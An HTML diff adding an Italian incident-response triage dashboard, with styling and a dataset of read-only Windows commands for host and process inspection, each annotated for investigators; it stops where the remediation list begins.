@@ -1,0 +1,1803 @@
+<!doctype html>
+<html lang="it" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IR-Cheatsheet</title>
+<style>
+  :root{
+    --bg:#0a0d0f;
+    --bg-panel:#12171a;
+    --bg-panel-alt:#161c1f;
+    --border:#212a2d;
+    --text:#dfe8ea;
+    --text-dim:#9aa8ab;
+    --text-faint:#5c6b6e;
+    --code-bg:#0d1113;
+    --danger:#ff6b6b;
+    --ok:#39d98a;
+    --win-accent:#4da6ff;
+    --lin-accent:#f2b134;
+    --dfir-accent:#c084fc;
+    --parsing-accent:#2dd4bf;
+    --placeholder:#ff9d3f;
+    --accent:#4da6ff;
+    --font-mono: ui-monospace, "Cascadia Code", "SF Mono", Consolas, "Roboto Mono", monospace;
+    --font-sans: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    --radius: 6px;
+  }
+  html[data-theme="light"]{
+    --bg:#f3f6f5;
+    --bg-panel:#ffffff;
+    --bg-panel-alt:#eef2f1;
+    --border:#dde3e1;
+    --text:#10161a;
+    --text-dim:#4d5b5e;
+    --text-faint:#7c8b8e;
+    --code-bg:#eef2f1;
+    --win-accent:#1f6fd6;
+    --lin-accent:#a1720a;
+    --dfir-accent:#8b3fd1;
+    --parsing-accent:#0f9488;
+    --placeholder:#b45309;
+  }
+  html[data-area="windows"]{ --accent: var(--win-accent); }
+  html[data-area="linux"]{ --accent: var(--lin-accent); }
+  html[data-area="dfir"]{ --accent: var(--dfir-accent); }
+  html[data-area="parsing"]{ --accent: var(--parsing-accent); }
+
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0; overflow-x:hidden; max-width:100vw;}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--font-sans);
+    min-height:100vh;
+  }
+  ::selection{ background:var(--accent); color:#0a0d0f; }
+  button{font-family:inherit;}
+  a{color:var(--accent);}
+
+  .cursor{
+    display:inline-block;
+    width:.5em;
+    color:var(--accent);
+    animation:blink 1s steps(1) infinite;
+  }
+  @keyframes blink{ 50%{opacity:0;} }
+  @media (prefers-reduced-motion: reduce){
+    .cursor{animation:none;}
+  }
+
+  /* ---------- Overlay di scelta area ---------- */
+  .overlay{
+    position:fixed; inset:0; z-index:999;
+    background:
+      radial-gradient(circle at 20% 20%, rgba(77,166,255,.06), transparent 40%),
+      radial-gradient(circle at 80% 80%, rgba(192,132,252,.06), transparent 40%),
+      var(--bg);
+    display:flex; align-items:center; justify-content:center;
+    transition:opacity .25s ease;
+  }
+  .overlay.hidden{ opacity:0; pointer-events:none; }
+  .overlay-inner{ text-align:center; max-width:640px; padding:32px; }
+  .boot-line{
+    font-family:var(--font-mono); font-size:13px; color:var(--text-faint);
+    margin-bottom:18px; letter-spacing:.02em;
+  }
+  .overlay-inner h1{
+    font-family:var(--font-mono); font-weight:600; font-size:clamp(28px,5vw,42px);
+    margin:0 0 10px; letter-spacing:-.01em;
+  }
+  .overlay-sub{ color:var(--text-dim); margin:0 0 30px; font-size:15px; }
+  .area-choice{ display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
+  .area-btn{
+    font-family:var(--font-mono); font-size:15px; font-weight:600;
+    padding:16px 28px; border-radius:var(--radius); cursor:pointer;
+    background:var(--bg-panel); color:var(--text); border:1px solid var(--border);
+    min-width:150px; transition:transform .12s ease, border-color .12s ease, box-shadow .12s ease;
+  }
+  .area-btn:hover{ transform:translateY(-2px); }
+  .area-btn:focus-visible{ outline:2px solid var(--accent); outline-offset:2px; }
+  .area-btn.win:hover{ border-color:var(--win-accent); box-shadow:0 0 0 1px var(--win-accent) inset; }
+  .area-btn.lin:hover{ border-color:var(--lin-accent); box-shadow:0 0 0 1px var(--lin-accent) inset; }
+  .area-btn.dfir:hover{ border-color:var(--dfir-accent); box-shadow:0 0 0 1px var(--dfir-accent) inset; }
+  .area-btn .sub{ display:block; font-family:var(--font-sans); font-weight:400; font-size:11.5px; color:var(--text-faint); margin-top:4px; }
+
+  /* ---------- Header ---------- */
+  .topbar{
+    position:sticky; top:0; z-index:50;
+    display:flex; align-items:center; justify-content:space-between;
+    gap:16px; padding:12px 20px;
+    background:var(--bg-panel); border-bottom:1px solid var(--border);
+  }
+  .brand{ display:flex; align-items:baseline; gap:14px; min-width:0; }
+  .brand-title{ font-family:var(--font-mono); font-weight:700; font-size:19px; white-space:nowrap; }
+  .brand-path{
+    font-family:var(--font-mono); font-size:12.5px; color:var(--text-faint);
+    white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+  }
+  .topbar-actions{ display:flex; align-items:center; gap:10px; }
+
+  .search-wrap{ position:relative; }
+  #searchInput{
+    width:280px; background:var(--bg-panel-alt); border:1px solid var(--border);
+    color:var(--text); border-radius:var(--radius); padding:9px 12px 9px 32px;
+    font-family:var(--font-mono); font-size:13px;
+  }
+  #searchInput:focus{ outline:2px solid var(--accent); outline-offset:1px; }
+  .search-wrap::before{
+    content:"⌕"; position:absolute; left:10px; top:50%; transform:translateY(-50%);
+    color:var(--text-faint); font-size:16px; pointer-events:none;
+  }
+  .search-results{
+    position:absolute; top:calc(100% + 6px); right:0; width:420px; max-height:420px;
+    overflow-y:auto; background:var(--bg-panel); border:1px solid var(--border);
+    border-radius:var(--radius); box-shadow:0 12px 28px rgba(0,0,0,.35); z-index:60;
+  }
+  .search-results.hidden{ display:none; }
+  .sr-empty{ padding:16px; color:var(--text-faint); font-size:13px; text-align:center; }
+  .sr-item{
+    display:block; width:100%; text-align:left; background:none; border:none;
+    border-bottom:1px solid var(--border); color:var(--text); padding:10px 14px; cursor:pointer;
+  }
+  .sr-item:last-child{ border-bottom:none; }
+  .sr-item:hover, .sr-item:focus-visible{ background:var(--bg-panel-alt); }
+  .sr-item .sr-title{ font-size:13.5px; font-weight:600; }
+  .sr-item .sr-meta{ font-family:var(--font-mono); font-size:11px; color:var(--text-faint); margin-top:3px; }
+  .sr-item .sr-meta .tag{ color:var(--accent); }
+
+  .icon-btn{
+    background:var(--bg-panel-alt); border:1px solid var(--border); color:var(--text);
+    width:36px; height:36px; border-radius:var(--radius); cursor:pointer;
+    display:flex; align-items:center; justify-content:center; font-size:16px;
+  }
+  .icon-btn:hover{ border-color:var(--accent); }
+  .icon-btn:focus-visible{ outline:2px solid var(--accent); outline-offset:1px; }
+
+  /* ---------- Area tabs & category tabs ---------- */
+  .area-tabs{
+    display:flex; gap:8px; padding:10px 20px; background:var(--bg);
+    border-bottom:1px solid var(--border); flex-wrap:wrap;
+  }
+  .area-tab{
+    font-family:var(--font-mono); font-size:12.5px; font-weight:600;
+    padding:7px 14px; border-radius:999px; cursor:pointer;
+    background:var(--bg-panel); border:1px solid var(--border); color:var(--text-dim);
+  }
+  .area-tab.active{ color:#0a0d0f; background:var(--accent); border-color:var(--accent); }
+  .area-tab:focus-visible{ outline:2px solid var(--accent); outline-offset:1px; }
+
+  .category-tabs{
+    display:flex; gap:8px; padding:12px 20px; background:var(--bg-panel);
+    border-bottom:1px solid var(--border); flex-wrap:wrap; position:sticky; top:61px; z-index:40;
+  }
+  .cat-tab{
+    font-size:12.5px; font-weight:600; padding:7px 13px; border-radius:var(--radius);
+    cursor:pointer; background:var(--bg-panel-alt); border:1px solid var(--border); color:var(--text-dim);
+  }
+  .cat-tab.active{ color:var(--accent); border-color:var(--accent); background:var(--bg-panel); }
+  .cat-tab:focus-visible{ outline:2px solid var(--accent); outline-offset:1px; }
+
+  /* ---------- Contenuto (allineato a sinistra) ---------- */
+  main{ padding:24px 32px 90px; width:100%; margin:0; }
+  .section{ margin-bottom:26px; scroll-margin-top:150px; }
+  .section-head{
+    display:flex; align-items:baseline; gap:10px; margin-bottom:9px;
+    border-bottom:1px solid var(--border); padding-bottom:6px;
+  }
+  .section-head h2{ font-size:16px; margin:0; font-family:var(--font-mono); }
+  .section-head .count{ font-size:11.5px; color:var(--text-faint); font-family:var(--font-mono); }
+
+  .card{
+    background:var(--bg-panel); border:1px solid var(--border); border-radius:var(--radius);
+    padding:9px 13px; margin-bottom:7px; transition:box-shadow .25s ease, border-color .25s ease;
+    text-align:left;
+  }
+  .card.flash{ border-color:var(--accent); box-shadow:0 0 0 2px var(--accent); }
+  .card-title{ font-size:12.5px; font-weight:600; line-height:1.35; white-space:normal; word-break:break-word; min-width:0; cursor:default; }
+  .badge{
+    font-family:var(--font-mono); font-size:10px; font-weight:700; letter-spacing:.03em;
+    padding:2px 6px; border-radius:4px; text-transform:uppercase; white-space:nowrap;
+  }
+  .badge.PowerShell{ background:rgba(77,166,255,.15); color:#4da6ff; }
+  .badge.CMD{ background:rgba(154,168,171,.18); color:#b7c3c5; }
+  .badge.Bash{ background:rgba(242,177,52,.18); color:#f2b134; }
+  .badge.rem{ background:rgba(255,107,107,.15); color:var(--danger); margin-left:6px; }
+
+  .cmd-row{ display:flex; align-items:flex-start; gap:7px; min-width:0; }
+  .copy-btn{
+    flex-shrink:0; display:flex; align-items:center; justify-content:center;
+    background:var(--bg-panel-alt); border:1px solid var(--border); color:var(--text-dim);
+    width:22px; height:22px; padding:0; border-radius:4px; cursor:pointer; font-family:var(--font-mono);
+    margin-top:1px;
+  }
+  .copy-btn .copy-icon{ font-size:13px; line-height:1; }
+  .copy-btn .copy-label{ display:none; }
+  .copy-btn:hover{ color:var(--text); border-color:var(--accent); }
+  .copy-btn.copied{ color:var(--ok); border-color:var(--ok); }
+  pre.code{
+    flex:1; min-width:0; margin:0; background:var(--code-bg); border:1px solid var(--border);
+    border-radius:4px; padding:6px 10px; overflow-x:visible;
+    white-space:pre-wrap; word-break:break-all; overflow-wrap:anywhere;
+    font-family:var(--font-mono); font-size:12px; line-height:1.4; color:var(--text);
+  }
+
+  /* ---------- Blocco Remediation ---------- */
+  .rem-divider{
+    display:flex; align-items:center; gap:8px; margin:10px 0 6px; padding-top:8px;
+    border-top:1px dashed var(--border);
+  }
+  .rem-divider .rem-label{
+    font-family:var(--font-mono); font-size:11px; font-weight:700; letter-spacing:.04em;
+    text-transform:uppercase; color:var(--danger);
+  }
+  .card.rem-card{ border-left:3px solid var(--danger); }
+
+  /* ---------- Layout a colonne: Teoria | Individuazione | Remediation ---------- */
+  .section-cols{ display:grid; gap:14px; align-items:start; min-width:0; }
+  .col-theory, .col-detect, .col-rem{ min-width:0; }
+  .col-head{
+    font-family:var(--font-mono); font-size:10.5px; font-weight:700; letter-spacing:.05em;
+    text-transform:uppercase; color:var(--text-faint); margin-bottom:8px; padding-bottom:6px;
+    border-bottom:1px solid var(--border); display:flex; align-items:center; gap:6px;
+  }
+  .col-head.theory{ color:var(--accent); }
+  .col-head.detect{ color:var(--accent); }
+  .col-head.rem{ color:var(--danger); }
+  .col-detect .card, .col-rem .card{ margin-bottom:7px; }
+
+  .theory-card{
+    background:var(--bg-panel); border:1px solid var(--border); border-radius:var(--radius);
+    padding:11px 13px; font-size:12px; line-height:1.5;
+  }
+  .theory-path-row{ margin-bottom:7px; }
+  .theory-path-row:last-child{ margin-bottom:0; }
+  .theory-path{
+    font-family:var(--font-mono); font-size:12px; color:var(--accent); font-weight:600;
+    word-break:break-all;
+  }
+  .theory-desc{ color:var(--text-dim); font-size:11.5px; margin-top:1px; }
+  .theory-note{
+    margin-top:9px; padding-top:8px; border-top:1px dashed var(--border);
+    font-size:11.5px; color:var(--text-dim); line-height:1.5;
+  }
+  .theory-note:first-child{ margin-top:0; padding-top:0; border-top:none; }
+  .theory-note b{ color:var(--danger); }
+  .theory-note.warn{ color:var(--placeholder); }
+  .theory-note code{ font-family:var(--font-mono); font-size:11px; background:var(--code-bg); padding:1px 4px; border-radius:3px; }
+
+  @media (max-width:1100px){
+    .section-cols{ grid-template-columns:1fr !important; }
+  }
+
+  .wip{
+    text-align:left; padding:70px 0; color:var(--text-dim);
+  }
+  .wip .wip-icon{ font-size:38px; margin-bottom:14px; }
+  .wip h2{ font-family:var(--font-mono); margin:0 0 8px; }
+
+  .placeholder{ color:var(--placeholder); font-weight:700; }
+
+  /* ---------- Parsing view ---------- */
+  .parsing-view{ max-width:100%; }
+  .upload-box{
+    display:flex; flex-direction:column; gap:6px; align-items:flex-start;
+    border:1px dashed var(--border); border-radius:var(--radius); padding:22px 20px;
+    cursor:pointer; background:var(--bg-panel); margin-bottom:16px; max-width:680px;
+  }
+  .upload-box:hover{ border-color:var(--accent); }
+  .upload-box .upload-title{ font-weight:700; font-size:14px; }
+  .upload-box .upload-hint{ font-size:12px; color:var(--text-faint); line-height:1.55; }
+  .parsing-file-info{
+    font-family:var(--font-mono); font-size:12px; color:var(--text-dim);
+    margin-bottom:16px; padding:8px 12px; background:var(--bg-panel-alt);
+    border:1px solid var(--border); border-radius:var(--radius); display:inline-block;
+  }
+  .parsing-file-info.hidden{ display:none; }
+  .parsing-file-info .tag-known{ color:var(--accent); font-weight:700; }
+  .table-toolbar{ display:flex; align-items:center; gap:12px; margin-bottom:10px; flex-wrap:wrap; }
+  .table-filter, .txt-filter{
+    flex:1; max-width:360px; background:var(--bg-panel-alt); border:1px solid var(--border);
+    color:var(--text); border-radius:var(--radius); padding:8px 10px; font-family:var(--font-mono); font-size:13px;
+  }
+  .table-filter:focus, .txt-filter:focus{ outline:2px solid var(--accent); outline-offset:1px; }
+  .table-count{ font-family:var(--font-mono); font-size:12px; color:var(--text-faint); white-space:nowrap; }
+  .table-scroll{ max-height:65vh; overflow:auto; border:1px solid var(--border); border-radius:var(--radius); }
+  table.data-table{ width:100%; border-collapse:collapse; font-size:12.5px; }
+  table.data-table th, table.data-table td{
+    text-align:left; padding:7px 10px; border-bottom:1px solid var(--border); white-space:nowrap;
+    max-width:320px; overflow:hidden; text-overflow:ellipsis;
+  }
+  table.data-table th{
+    position:sticky; top:0; background:var(--bg-panel-alt); cursor:pointer; user-select:none;
+    font-family:var(--font-mono); font-size:11.5px; color:var(--text-dim); z-index:1;
+  }
+  table.data-table th:hover{ color:var(--accent); }
+  table.data-table tbody tr:hover{ background:var(--bg-panel-alt); }
+  .txt-viewer{
+    max-height:65vh; overflow:auto; background:var(--code-bg); border:1px solid var(--border);
+    border-radius:var(--radius); padding:12px 14px; font-family:var(--font-mono); font-size:12.5px; line-height:1.6;
+    margin:0; white-space:pre-wrap; word-break:break-all;
+  }
+  .txt-viewer mark{ background:var(--accent); color:#0a0d0f; border-radius:2px; padding:0 1px; }
+
+  /* ---------- Checklist esecuzione + output ---------- */
+  .card-head{ display:flex; align-items:flex-start; gap:7px; margin-bottom:6px; flex-wrap:nowrap; }
+  .card-head .card-title{ margin:0; flex:1; }
+  .card-head .badge{ flex-shrink:0; }
+  .exec-label{ display:flex; align-items:center; padding-top:1px; cursor:pointer; }
+  .exec-check{ width:15px; height:15px; accent-color:var(--accent); cursor:pointer; }
+  .card.done{ border-color:var(--ok); }
+  .card.done .card-title{ color:var(--text-dim); }
+
+  textarea.output-box{
+    flex:0 0 64px; min-width:0; height:26px; resize:none; overflow:hidden;
+    background:var(--bg-panel-alt); border:1px solid var(--border); color:var(--text);
+    border-radius:4px; padding:5px 8px; font-family:var(--font-mono); font-size:11.5px; line-height:1.4;
+    transition:flex-basis .15s ease, height .15s ease; cursor:text;
+  }
+  textarea.output-box:focus, textarea.output-box:not(:placeholder-shown){
+    flex:1 1 240px; height:64px; overflow:auto; resize:vertical; cursor:auto;
+  }
+  textarea.output-box:focus{ outline:2px solid var(--accent); outline-offset:1px; }
+  textarea.output-box::placeholder{ color:var(--text-faint); }
+
+  /* ---------- Torna in cima ---------- */
+  .back-to-top{
+    position:fixed; bottom:24px; right:24px; z-index:80;
+    width:44px; height:44px; border-radius:50%;
+    background:var(--accent); color:#0a0d0f; border:none; cursor:pointer;
+    font-size:19px; box-shadow:0 6px 18px rgba(0,0,0,.35);
+    opacity:0; pointer-events:none; transform:translateY(10px);
+    transition:opacity .2s ease, transform .2s ease;
+  }
+  .back-to-top.visible{ opacity:1; pointer-events:auto; transform:translateY(0); }
+  .back-to-top:focus-visible{ outline:2px solid var(--text); outline-offset:2px; }
+
+  /* ---------- Report di stampa ---------- */
+  #printReport{ display:none; }
+  #printReport h1{ font-family:var(--font-mono); font-size:20px; margin:0 0 4px; color:#000; }
+  #printReport .report-meta{ font-size:12px; color:#444; margin-bottom:20px; }
+  #printReport .report-item{ margin-bottom:18px; padding-bottom:14px; border-bottom:1px solid #ccc; page-break-inside:avoid; }
+  #printReport .report-item-head{ font-family:var(--font-mono); font-size:10.5px; color:#555; text-transform:uppercase; letter-spacing:.03em; margin-bottom:4px; }
+  #printReport .report-title{ font-weight:700; font-size:13px; margin-bottom:6px; color:#000; }
+  #printReport .report-cmd{ background:#f1f1f1; border:1px solid #ccc; border-radius:4px; padding:8px 10px; font-family:var(--font-mono); font-size:11.5px; white-space:pre-wrap; word-break:break-word; color:#000; margin:0 0 8px; }
+  #printReport .report-output-label{ font-size:11px; font-weight:700; color:#555; margin-bottom:3px; }
+  #printReport .report-output{ background:#fafafa; border:1px dashed #ccc; border-radius:4px; padding:8px 10px; font-family:var(--font-mono); font-size:11.5px; white-space:pre-wrap; word-break:break-word; color:#111; margin:0; min-height:20px; }
+  #printReport .report-empty{ padding:40px; text-align:center; color:#555; }
+
+  @media print{
+    body{ background:#fff !important; color:#000 !important; }
+    body > *:not(#printReport){ display:none !important; }
+    #printReport{ display:block !important; }
+  }
+
+  @media (max-width:720px){
+    .topbar{ flex-wrap:wrap; }
+    #searchInput{ width:200px; }
+    .search-results{ width:min(90vw,420px); right:0; }
+    .brand-path{ display:none; }
+    main{ padding:20px 16px 80px; }
+    .cmd-row{ flex-direction:column; }
+    .copy-btn{ align-self:flex-start; }
+    textarea.output-box{ width:100%; flex-basis:auto; }
+    .back-to-top{ bottom:16px; right:16px; width:40px; height:40px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="overlay" id="overlay">
+  <div class="overlay-inner">
+    <div class="boot-line">root@triage:~$ ./select-environment.sh</div>
+    <h1>IR-Cheatsheet<span class="cursor">_</span></h1>
+    <p class="overlay-sub">Seleziona l'ambiente da analizzare per iniziare il triage</p>
+    <div class="area-choice">
+      <button class="area-btn win" data-area="windows">Windows<span class="sub">host triage</span></button>
+      <button class="area-btn lin" data-area="linux">Linux<span class="sub">host triage</span></button>
+      <button class="area-btn dfir" data-area="dfir">DFIR<span class="sub">work in progress</span></button>
+    </div>
+  </div>
+</div>
+
+<header class="topbar">
+  <div class="brand">
+    <span class="brand-title">IR-Cheatsheet<span class="cursor">_</span></span>
+    <span class="brand-path" id="breadcrumb">root@triage:~#</span>
+  </div>
+  <div class="topbar-actions">
+    <div class="search-wrap">
+      <input id="searchInput" type="text" placeholder="Cerca comandi... (min 3 caratteri)" autocomplete="off">
+      <div class="search-results hidden" id="searchResults"></div>
+    </div>
+    <button class="icon-btn" id="reportBtn" title="Genera report dei comandi eseguiti" aria-label="Report">🖨</button>
+    <button class="icon-btn" id="themeToggle" title="Cambia tema" aria-label="Cambia tema">◐</button>
+  </div>
+</header>
+
+<nav class="area-tabs" id="areaTabs">
+  <button class="area-tab" data-area="windows">Windows</button>
+  <button class="area-tab" data-area="linux">Linux</button>
+  <button class="area-tab" data-area="dfir">DFIR</button>
+  <button class="area-tab" data-area="parsing">📄 Parsing</button>
+</nav>
+
+<nav class="category-tabs" id="categoryTabs"></nav>
+
+<main id="content"></main>
+
+<button id="backToTop" class="back-to-top" title="Torna in cima" aria-label="Torna in cima">↑</button>
+
+<div id="printReport"></div>
+
+<script>
+/* =========================================================
+   DATASET COMANDI
+   Ogni comando: t = titolo/descrizione, y = "PowerShell" | "CMD" | "Bash", c = comando
+   ========================================================= */
+const DATA = {
+windows: [
+  { id:'sysinfo', name:'System Info', theory:{
+    paths:[],
+    notes:[
+      "Comandi puramente informativi: non rappresentano di per sé una superficie di attacco, ma servono a orientarsi rapidamente sull'host e a sincronizzare correttamente la timeline forense prima di procedere con l'analisi.",
+    ],
+  }, items:[
+    {t:"Panoramica rapida dell'host: nome, dominio, ruolo nel dominio, versione/build del sistema operativo, data dell'ultimo riavvio e serial number del BIOS. Il primo comando utile per orientarsi sull'ambiente.", y:"PowerShell", c:`Get-ComputerInfo -Property CsName,CsDomain,CsDomainRole,WindowsProductName,OsVersion,OsBuildNumber,OsLastBootUpTime,BiosSerialNumber`},
+    {t:"Configurazione di rete completa dell'host: indirizzi IP, gateway, server DNS e MAC address di tutte le interfacce, incluse quelle virtuali (VPN, VM, adattatori software).", y:"CMD", c:`ipconfig /all`},
+    {t:"Elenco degli adattatori di rete con stato e MAC address: utile per individuare interfacce virtuali o adattatori non censiti tra quelli attesi sull'host.", y:"PowerShell", c:`Get-NetAdapter | Select-Object Name,InterfaceDescription,Status,MacAddress`},
+    {t:"Tabella ARP della cache locale: permette di individuare host che hanno comunicato di recente sulla rete locale, utile per mappare movimenti laterali.", y:"CMD", c:`arp -a`},
+    {t:"Tabella di routing attiva: verifica la presenza di rotte statiche anomale aggiunte manualmente per instradare il traffico verso destinazioni non previste.", y:"CMD", c:`route print`},
+    {t:"Utente corrente con l'elenco completo di gruppi e privilegi assegnati: fondamentale per capire con quali permessi si sta operando durante il triage.", y:"CMD", c:`whoami /all`},
+    {t:"Elenco degli utenti locali con stato dell'account, data di ultimo accesso e ultima modifica password: individua account creati, riattivati o modificati di recente.", y:"PowerShell", c:`Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordLastSet`},
+    {t:"Membri del gruppo Administrators locale: la presenza di un membro non autorizzato è uno degli indicatori più diretti di escalation di privilegi (MITRE T1098).", y:"PowerShell", c:`Get-LocalGroupMember -Group "Administrators"`},
+    {t:"Utenti con una sessione attiva sull'host, sia in console che via RDP, con relativo stato della sessione.", y:"CMD", c:`query user`},
+    {t:"Tutte le sessioni RDP/console attive, incluse quelle disconnesse: vista più ampia di query user.", y:"CMD", c:`query session`},
+    {t:"Elenco sintetico di tutti gli account locali configurati sull'host.", y:"CMD", c:`net user`},
+    {t:"Dettagli completi su un account locale specifico: ultimo logon, scadenza password, gruppi di appartenenza.", y:"CMD", c:`net user <nome-utente>`},
+    {t:"Membri del gruppo Administrators locale via cmd, alternativa a Get-LocalGroupMember quando PowerShell non è disponibile.", y:"CMD", c:`net localgroup administrators`},
+    {t:"Elenco di tutti i gruppi locali configurati sull'host.", y:"CMD", c:`net localgroup`},
+    {t:"Privilegi assegnati all'utente corrente: individua privilegi elevati assegnati in modo anomalo (es. SeDebugPrivilege, SeImpersonatePrivilege).", y:"CMD", c:`whoami /priv`},
+    {t:"Dettagli completi di tutti gli account locali tramite wmic, alternativa quando i cmdlet PowerShell sono bloccati da policy.", y:"CMD", c:`wmic useraccount list full`},
+    {t:"Policy di password e lockout configurata per gli account locali: utile per capire se un attaccante ha rilassato i vincoli per facilitare un brute force.", y:"CMD", c:`net accounts`},
+    {t:"Report esteso del sistema: hotfix installati, memoria, dominio, boot time e molte altre informazioni in un unico output; più lento ma molto completo.", y:"CMD", c:`systeminfo`},
+    {t:"Ora locale riportata dal sistema operativo: confrontala con l'ora reale per individuare un'eventuale manipolazione dell'orologio di sistema, tecnica usata per confondere la timeline forense.", y:"PowerShell", c:`(Get-CimInstance Win32_OperatingSystem).LocalDateTime`},
+    {t:"Hotfix e patch di sicurezza installate, ordinate per data di installazione: utile per valutare la finestra di esposizione a CVE note sull'host.", y:"PowerShell", c:`Get-HotFix | Sort-Object InstalledOn -Descending`},
+    {t:"Stessa informazione sulle patch installate ottenuta tramite wmic: utile quando i cmdlet PowerShell non sono disponibili o sono bloccati da policy.", y:"CMD", c:`wmic qfe list full`},
+    {t:"Informazioni hardware e di dominio della macchina: produttore, modello, memoria totale installata e dominio di appartenenza.", y:"PowerShell", c:`Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,TotalPhysicalMemory`},
+    {t:"Esporta il report completo di systeminfo in un file TXT in C:\\Windows\\Temp con timestamp automatico nel nome: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato con filtro riga per riga.", y:"PowerShell", c:`systeminfo | Out-File -FilePath "C:\\Windows\\Temp\\ircheatsheet_sysinfo_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"`},
+  ]},
+  { id:'process', name:'Process', theory:{
+    paths:[],
+    notes:[
+      "Il PID è la chiave di correlazione tra processo, connessione di rete e voce di persistenza: annotalo sempre prima di procedere con la remediation, così puoi ricostruire l'intera catena dopo aver terminato il processo.",
+    ],
+  }, items:[
+    {t:"Primi 20 processi per consumo di CPU con relativo percorso su disco dell'eseguibile: punto di partenza classico per individuare attività anomale in corso.", y:"PowerShell", c:`Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name,Id,CPU,Path`},
+    {t:"Elenco processi con la sessione utente associata a ciascuno: utile su host multi-utente o con più sessioni RDP concorrenti.", y:"CMD", c:`tasklist /v`},
+    {t:"Processi con command line completa e Parent Process ID: essenziale per individuare tecniche living-off-the-land (es. un documento Office che genera powershell.exe) e catene di esecuzione sospette.", y:"PowerShell", c:`Get-CimInstance Win32_Process | Select-Object Name,ProcessId,ParentProcessId,CommandLine`},
+    {t:"Stessa vista di nome, PID, PPID e percorso eseguibile ottenuta tramite wmic, utilizzabile anche da un prompt cmd con privilegi limitati o policy restrittive su PowerShell.", y:"CMD", c:`wmic process get Name,ProcessId,ParentProcessId,ExecutablePath`},
+    {t:"Processi attualmente in esecuzione privi di un percorso su disco: sintomo tipico di process hollowing, reflective DLL injection o processi con handle residuo dopo la terminazione.", y:"PowerShell", c:`Get-Process | Where-Object { $null -eq $_.Path }`},
+    {t:"Servizi Windows ospitati da ciascun processo in esecuzione (es. quali servizi girano dentro un dato svchost.exe): utile per capire l'origine di un processo apparentemente generico.", y:"CMD", c:`tasklist /svc`},
+    {t:"Hash SHA256 di tutti i binari attualmente in esecuzione, pronti per essere confrontati con IOC noti o interrogati su VirusTotal in blocco.", y:"PowerShell", c:`Get-Process | Where-Object { $_.Path } | ForEach-Object { Get-FileHash -Path $_.Path -Algorithm SHA256 -ErrorAction SilentlyContinue } | Select-Object Hash,Path`},
+    {t:"Moduli e DLL caricate da un processo specifico: permette di individuare DLL injection o side-loading di librerie malevole mascherate con nomi legittimi.", y:"PowerShell", c:`Get-Process -Id <PID> | Select-Object -ExpandProperty Modules | Select-Object ModuleName,FileName`},
+    {t:"Command line completa per un PID specifico, utile per un lookup puntuale senza filtrare l'intero elenco processi.", y:"CMD", c:`wmic process where ProcessId=<PID> get CommandLine`},
+    {t:"Processi ordinati per orario di avvio, dal più recente: utile per individuare rapidamente cosa è partito subito dopo un evento sospetto.", y:"PowerShell", c:`Get-Process | Select-Object Name,Id,StartTime | Sort-Object StartTime -Descending`},
+    {t:"Processi con PowerShell richiamato all'interno della propria command line: individua esecuzioni living-off-the-land anche quando il processo principale non è powershell.exe.", y:"PowerShell", c:`Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*powershell*' }`},
+    {t:"Percorso completo dell'eseguibile e command line per tutti i processi, tramite l'oggetto WMI legacy: utile in ambienti dove i cmdlet CIM non sono disponibili.", y:"PowerShell", c:`Get-WmiObject Win32_Process | Select-Object Name,ExecutablePath,CommandLine | Format-List`},
+    {t:"Percorso del binario di un processo specifico tramite il modulo principale: alternativa rapida a Get-Process con filtro sul Path.", y:"PowerShell", c:`(Get-Process -Id <PID>).MainModule.FileName`},
+    {t:"Processi con una finestra visibile: utile per distinguere strumenti amministrativi lasciati aperti da attività realmente in background.", y:"PowerShell", c:`Get-Process | Where-Object { $_.MainWindowTitle -ne '' }`},
+    {t:"Elenco rapido dei processi con handle, thread e memoria, utile come vista d'insieme leggera prima di un'analisi più approfondita.", y:"CMD", c:`wmic process list brief`},
+    {t:"DLL caricate da ciascun processo in esecuzione, in un'unica vista: utile per una ricerca ampia di side-loading senza dover interrogare un processo alla volta.", y:"PowerShell", c:`Get-Process | Select-Object Name,Id,Modules | ForEach-Object { $_.Modules | Select-Object @{N='Process';E={$_.Name}},FileName }`},
+    {t:"Elenco dei processi che hanno caricato una DLL specifica: utile per individuare rapidamente tutti i punti di impatto di una libreria malevola nota.", y:"CMD", c:`tasklist /m <nome_dll>`},
+    {t:"Elenco di tutti i processi con le rispettive DLL caricate, in blocco.", y:"CMD", c:`tasklist /m`},
+    {t:"Processi ordinati per utilizzo di memoria (working set): individua rapidamente processi anomali per consumo di RAM.", y:"CMD", c:`wmic process get ProcessId,Name,WorkingSetSize | Sort /+50`},
+    {t:"Verifica la presenza in memoria di un oggetto COM specifico (es. WScript.Shell): tecnica di rilevamento per alcuni loader fileless.", y:"PowerShell", c:`[System.Runtime.InteropServices.Marshal]::GetActiveObject('WScript.Shell')`},
+    {t:"Processi che non rispondono: può indicare un crash, un hang, o un processo bloccato deliberatamente da una tecnica di evasione.", y:"PowerShell", c:`Get-Process | Where-Object { $_.Responding -eq $false }`},
+    {t:"Processi avviati da cartelle utente o temporanee invece delle consuete Program Files/System32: la posizione di esecuzione anomala è spesso un indicatore più affidabile del solo nome del processo.", y:"PowerShell", c:`Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -match 'Temp|AppData|Users\\\\Public' } | Select-Object Name,ProcessId,ExecutablePath`},
+    {t:"Esporta l'elenco completo dei processi in CSV in C:\\Windows\\Temp con timestamp automatico: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato come tabella filtrabile e ordinabile.", y:"PowerShell", c:`Get-CimInstance Win32_Process | Select-Object Name,ProcessId,ParentProcessId,CommandLine,ExecutablePath | Export-Csv -NoTypeInformation -Path "C:\\Windows\\Temp\\ircheatsheet_process_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"`},
+  ], remediation:[
